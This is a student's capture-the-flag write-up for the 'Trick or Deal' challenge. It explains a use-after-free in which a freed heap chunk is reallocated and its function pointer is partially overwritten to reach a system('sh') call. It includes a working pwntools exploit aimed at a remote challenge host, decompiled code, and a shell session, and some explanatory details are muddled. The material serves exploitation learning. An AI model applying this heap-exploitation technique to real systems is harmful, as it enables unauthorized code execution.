# Trick or Deal

#### Note that I am a student  still learning, Incase i said/mentioned something wrong, please correct me

```python
from pwn import *

#io = process("./trick_or_deal")
io = remote("154.57.164.78",42865)
elf = context.binary = ELF("./trick_or_deal")


io.sendlineafter(b'[*] What do you want to do? ', b'4')
io.sendlineafter(b'[*] What do you want to do? ', b'3')
io.sendlineafter(b'[*] Are you sure that you want to make an offer(y/n): ', b'y')
io.sendlineafter(b'[*] How long do you want your offer to be? ', b'80')

addr = p16(elf.sym.unlock_storage)
print(f"[+] unlock_storage address : {addr}")
payload = b'A' * 72
payload += addr

io.sendafter(b'[*] What can you offer me? ', payload) ## apparently this piece of shit was supposed to be "sendafter" and not sendlineafter
io.sendlineafter(b'[*] What do you want to do? ', b'1')

io.interactive()
```

Explaination incoming :

Before i get into the details of this challenge, i will be explaining to myself what is the correct 
sequence of the UAF and what is automatically called before anything, etc.

1. Allocate an object.
2. Free the object, which will the pointer behind.
3. Allocate another object that reuses the same memory.
4. Access the original object through its old pointer.

Now, in this challenge, we didn't need step 1, because it was already called in the main functions, so no need
to allocate it first
```
{
  undefined8 in_R9;
  
  setup();
  fprintf(stdout,"%s %s Welcome to the Intergalactic Weapon Black Market %s\n",&DAT_0010123c,
          &DAT_00101241,&DAT_0010123c,in_R9,param_2);
  fprintf(stdout,"\n%sLoading the latest weaponry . . .\n%s",&DAT_0010128b,&DAT_00101241);
  sleep(3);
  update_weapons();
  fflush(stdout);
  menu();
  return 0;
}
```


as we can see :

  update_weapons();

is there. which does this ;

```

{
  storage = malloc(0x50);
  strcpy(storage,weapons);
  *(code **)(storage + 0x48) = printStorage;
  return;
}
```


So we free it, then allocate our own payload and then run '1' to get the call the address in the chunk, which 
will be the unlock_weapons.

This is the main fucntion :
```
{
  undefined8 in_R9;
  
  setup();
  fprintf(stdout,"%s %s Welcome to the Intergalactic Weapon Black Market %s\n",&DAT_0010123c,
          &DAT_00101241,&DAT_0010123c,in_R9,param_2);
  fprintf(stdout,"\n%sLoading the latest weaponry . . .\n%s",&DAT_0010128b,&DAT_00101241);
  sleep(3);
  update_weapons();
  fflush(stdout);
  menu();
  return 0;
}

```
we see that it somewhere calls "  update_weapons();", which leads to this important piece :
```
{
  storage = malloc(0x50);
  strcpy(storage,weapons);
  *(code **)(storage + 0x48) = printStorage;
  return;
}
```
this is allocating the variable "storage" 0x50 bytes (80) bytes of storage.

There is a menu function as well, which i will not paste here due to it's size.

What we should do now is just look at which one of the following does what :
```
-_-_-_-_-_-_-_-_-_-_-_-_-                                                                                           
|                       |                                                                                           
|  [1] See the Weaponry | This is the funciton that allocates the 80 bytes chunk.                                                                              
|  [2] Buy Weapons      | buy                                                                    
|  [3] Make an Offer    | make_offer                                                                       
|  [4] Try to Steal     | the "steal function"                                                                              
|  [5] Leave            | Simply quits                                                                                           
|                       |                                                                                           
-_-_-_-_-_-_-_-_-_-_-_-_-
```
after looking into each one, we will see that the "steal" funciton frees storage :
```
{
  fwrite("\n[*] Sneaks into the storage room wearing a face mask . . . \n",1,0x3d,stdout);
  sleep(2);
  fprintf(stdout,"%s[*] Guard: *Spots you*, Thief! Lockout the storage!\n",&DAT_0010131e);
  free(storage);
  sleep(2);
  fprintf(stdout,"%s[*] You, who didn\'t skip leg-day, escape!%s\n",&DAT_0010128b,&DAT_00101241);
  return;
}
```
So we have the allocation function (1) and the free function (4).

Now we need the input function, which is offer. as the chunk states, we wil allocate 80 bytes.

Looking at our data in memory :
```
0x5555556032a0: 0x6161616161616161      0x6161616161616162
0x5555556032b0: 0x6161616161616163      0x6161616161616164
0x5555556032c0: 0x6161616161616165      0x6161616161616166
0x5555556032d0: 0x6161616161616167      0x6161616161616168
0x5555556032e0: 0x6161616161616169      0x0000555555400b0a <----
0x5555556032f0: 0x0000000000000000      0x0000000000020d11 
```
After writing 72 bytes, we see a "0b0a", which is possible needed to be overwriten, since at 0x48 (72 bytes)
The code contains data right after the storage+0x48 part (after the 72 bytes being allocated) :
```
    if (local_b[0] != '1') break;
    (**(code **)(storage + 0x48))();
  }
```

So we will overwrite the 2 bytes with the p16() of the unlock_storage address that has an sh in it, leading to
code execution :

```
{
  fprintf(stdout,"\n%s[*] Bruteforcing Storage Access Code . . .%s\n",&DAT_001014a6,&DAT_0010149e);
  sleep(2);
  fprintf(stdout,"\n%s* Storage Door Opened *%s\n",&DAT_0010128b,&DAT_001014e1);
  system("sh");
  return;
}
```
Running the code, we get the flag :


```bash
kali@kali:~/pwn/uaf/challenge$ python3 exploit.py
[+] Starting local process './trick_or_deal': pid 61750
[*] '/home/kali/pwn/uaf/challenge/trick_or_deal'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./glibc/'
    Stripped:   No
[+] unlock_storage address : b'\xff\x0e'
[*] Switching to interactive mode

[*] Bruteforcing Storage Access Code . . .

* Storage Door Opened *
$ whoami
kali
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),124(lpadmin),132(wireshark),134(kaboxer),984(docker)
$ ls
core.42257  core.47410  core.48978  glibc      test.py
core.44245  core.48014  exploit.py  locations  trick_or_deal
$  
```
